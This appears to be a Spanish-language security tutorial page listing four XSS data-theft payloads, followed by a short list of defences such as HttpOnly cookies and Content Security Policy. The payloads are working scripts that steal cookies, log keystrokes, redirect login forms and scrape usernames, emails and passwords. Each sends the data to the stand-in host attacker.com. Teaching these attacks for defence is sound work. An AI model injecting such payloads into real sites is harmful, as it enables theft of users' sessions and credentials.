💀 Ejemplos de Robo de Datos con XSS

1. Robar Cookies y Enviarlas a un Servidor Externo:

<script> fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify({ cookies: document.cookie, users: document.querySelector('table').innerHTML }) }); </script>

2. Crear un Keylogger:

<script> document.onkeypress = function(e) { fetch('https://attacker.com/keys', { method: 'POST', body: e.key }); }; </script>

3. Modificar Formularios para Phishing:

<script> // Cambiar la acción de todos los formularios de login document.querySelectorAll('form').forEach(form => { form.action = 'https://attacker.com/phish'; }); </script>

4. Extraer Datos de la Página:

<script> // Extraer datos de la tabla de usuarios const tableData = []; document.querySelectorAll('table tbody tr').forEach(row => { const cells = row.querySelectorAll('td'); tableData.push({ username: cells[1].textContent, email: cells[2].textContent, password: cells[3].textContent }); }); // Enviar a servidor del atacante fetch('https://attacker.com/stolen-data', { method: 'POST', body: JSON.stringify(tableData) }); </script>
🛡️ Cómo Proteger Estos Datos
  • HTTPOnly Cookies: Las cookies marcadas como HTTPOnly no son accesibles desde JavaScript
  • Secure Cookies: Solo se envían sobre HTTPS
  • SameSite Cookies: Protegen contra CSRF y algunos XSS
  • Content Security Policy: Previene la ejecución de scripts maliciosos
  • Sanitización de Output: Escape de HTML en todo contenido dinámico
  • Principio de Menor Privilegio: No exponer más datos de los necesarios
